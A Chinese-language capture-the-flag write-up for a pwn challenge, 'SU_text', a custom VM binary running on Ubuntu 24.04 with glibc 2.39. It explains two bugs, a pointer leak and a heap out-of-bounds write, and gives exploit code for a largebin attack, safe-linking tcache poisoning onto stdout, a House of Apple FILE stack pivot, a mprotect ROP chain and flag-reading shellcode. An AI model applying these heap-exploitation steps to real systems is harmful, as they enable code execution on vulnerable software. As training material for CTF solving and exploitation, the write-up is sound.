# SU_text

## 题目简述

`SU_text` 是一个 64 位、动态链接且已去符号的 PIE ELF，开启 Full RELRO、Canary、NX、SHSTK 和 IBT。部署镜像基于 Ubuntu 24.04，利用脚本按其中的 glibc 2.39 布局计算偏移。

程序读取最多 `0xfff` 字节的自定义指令流。外层操作可以申请或释放 16 个、大小位于 `0x418` 到 `0x500` 之间的堆块；进入 VM 后，还能对选中堆块执行算术、逻辑、读写和显示操作。利用依赖两个相互配合的漏洞：

1. `show` 使用未校验的有符号相对偏移，可输出指令流前方的数据；
2. 逻辑运算会推进局部堆游标，却不检查游标是否越过所选 chunk，后续受限写因而变成堆越界写。

最终通过 largebin attack 扩大 tcache 支持范围，毒化 `0x500` 大小的 tcache 链，将 `_IO_2_1_stdout_` 分配出来，再用 House of Apple 风格的 FILE 结构触发栈迁移和 ORW。

## 解题过程

外层解释器的主要操作码为：

```text
0x01  堆管理
0x02  进入所选堆块的 VM
0x03  结束本轮指令流，返回下一次输入
```

堆管理子命令 `0x10` 和 `0x11` 分别负责申请、释放：

```python
def add_chunk(index, size):
    return p8(1) + p8(0x10) + p8(index) + p32(size)

def delete_chunk(index):
    return p8(1) + p8(0x11) + p8(index)
```

VM 中 `push`、`pop`、`show` 的编码为：

```python
def push(offset, value):
    return p8(0x10) + p8(0x14) + p32(offset) + value

def pop(offset):
    return p8(0x10) + p8(0x15) + p32(offset) + p64(0)

def show(relative):
    return p8(0x10) + p8(0x16) + p32(relative)
```

反编译后，`pop` 会把堆上八字节写入当前指令后面的占位区：

```c
if (offset > 0x410)
    _exit(1);
*(uint64_t *)(instruction + 4) = *(uint64_t *)(heap_cursor + offset);
```

`show` 则直接把参数当成相对当前指令的有符号偏移：

```c
write(1, (char *)offset_field + *offset_field + 4, 8);
```

这里没有检查负数。`pop` 总长为 14 字节，而 `show` 的偏移字段恰好位于后续位置；传入 `-14` 后，显示地址会回到前一条 `pop` 的八字节占位区：

```python
payload += pop(8) + show(0xfffffff2)  # -14
```

因此 `pop` 负责从所选堆块取值，`show(-14)` 负责把该值输出。通过下面的分配顺序，可以从重用后的 chunk 残留元数据中分别取出 heap 和 libc 指针：

```python
payload  = add_chunk(0, 0x418)
payload += add_chunk(1, 0x418)
payload += add_chunk(2, 0x418)
payload += add_chunk(3, 0x418)
payload += delete_chunk(0)
payload += delete_chunk(2)
payload += add_chunk(2, 0x418)

payload += p8(2) + p8(2)  # 进入 chunk 2
payload += pop(8) + show(-14)
payload += pop(0) + show(-14)
payload += p8(0) + p8(3)
```

附件 exp 对泄露值使用：

```python
heap_base = u64(io.recv(6).ljust(8, b"\x00")) - 0xad0
libc_base = (
    u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    - 0x203b20
)
```

这些是给定分配序列与部署 libc 的偏移，换镜像后必须重新确认。

第二个漏洞位于 VM 的逻辑运算。选中 chunk 后，程序把其地址复制到局部游标；`xor` 等操作接收游标地址并执行：

```c
if (**cursor != 0)
    _exit(1);
*(*cursor)++ = lhs ^ rhs;
```

每次写四字节并把 `*cursor` 向后推进四字节，却完全不比较原 chunk 大小。`push` 虽然要求自身的 `offset <= 0x410`，这个偏移却是相对已经前移的游标计算的。连续执行 `0x108 / 4` 次逻辑运算后，再执行 `push(0x410, value)`，实际写入位置是：

$$
\text{chunk base}+0x108+0x410
=\text{chunk base}+0x518
$$

这已经越过一个请求大小为 `0x4f8` 的 chunk。

先布置不同大小的 chunk，使越界位置落到待插入 largebin 的 chunk 元数据，并把其 `bk_nextsize` 相关指针改为：

```python
mp_tcache_bins_minus_0x20 = libc_base + 0x2031e8 - 0x20

payload += enter_vm(1)
payload += push(0, p64(0))
payload += push(8, p64(0))
payload += xor_op(1, 2) * (0x108 // 4)
payload += push(0x410, p64(mp_tcache_bins_minus_0x20))
payload += leave_vm()
```

后续分配触发 largebin 插入时，链表维护写落到 `mp_.tcache_bins`，扩大 glibc 认为可进入 tcache 的 size class 范围。这样原本不进入默认 tcache 的 `0x500` chunk 也能用于 tcache poisoning。

再利用同一游标越界改写释放块的 tcache `next`。glibc 2.39 启用 safe-linking，写入值应为：

```python
stdout = libc_base + libc.symbols["_IO_2_1_stdout_"]
freed_chunk_user = heap_base + 0x19f0
mangled_next = stdout ^ (freed_chunk_user >> 12)
```

完成 poisoned tcache 后连续申请两次 `0x4f8`，第二次分配会返回 `_IO_2_1_stdout_`。此时可通过 VM 的 `push` 接口逐八字节覆盖 stdout。

伪造结构采用 wide FILE 路径：

1. FILE 的 vtable 指向目标 libc 中合法的 `_IO_wfile_jumps` 路径，绕过 vtable 合法区检查；
2. `_wide_data` 指向伪 FILE 内部可控区域；
3. 伪 `_wide_vtable->__doallocate` 设置为 `mov rsp, rdx; ret`；
4. 相关写指针字段让下一次 `printf` 进入 wide overflow/doallocate 分支；
5. `rdx` 最终指向另一个堆块中的 ROP 链。

附件 exp 中关键地址为：

```python
mov_rsp_rdx_ret = libc_base + 0x5ef5f
pop_rdi_ret = libc_base + 0x10f75b
pop_rsi_ret = libc_base + 0x110a4d
pop_rdx_ret = libc_base + 0x66b9a
mprotect_addr = libc_base + libc.symbols["mprotect"]
```

ROP 链先把堆映射改为 RWX：

```python
rop  = p64(pop_rdi_ret) + p64(heap_base)
rop += p64(pop_rsi_ret) + p64(0x2000)
rop += p64(pop_rdx_ret) + p64(7)
rop += p64(mprotect_addr)
```

随后跳到同一堆块中的 shellcode：

```python
code  = shellcraft.open("/flag")
code += shellcraft.read(3, heap_base, 0x50)
code += shellcraft.write(1, heap_base, 0x50)
shellcode = asm(code)
```

最终 payload 以 `0x03` 结束本轮指令流。主循环开始下一轮时会再次调用 `printf` 输出提示，使用已被替换的 stdout，从而触发伪 FILE、执行栈迁移、ROP 和 ORW，输出 flag。

## 方法总结

本题的两处漏洞都来自“基准地址”与“边界检查对象”不一致。`show` 的偏移相对指令流计算，却允许负数；逻辑运算更新的是局部堆游标，而 `push` 仍只校验一个相对该游标的固定上限。把每个 VM 操作的输入指针、堆指针和返回后的指令指针分别标出，漏洞会比只看 switch 分发器清楚得多。

利用链同时依赖 glibc 版本：largebin 写入目标、`mp_.tcache_bins`、safe-linking、stdout 布局、合法 wide vtable 和 gadget 偏移都与 Ubuntu 24.04 的部署环境绑定。复现时应先稳定两个泄露，再逐阶段验证 largebin 写、tcache 返回 stdout、FILE 触发和栈迁移，不能把整个 exp 当成一个不可拆分的黑盒。
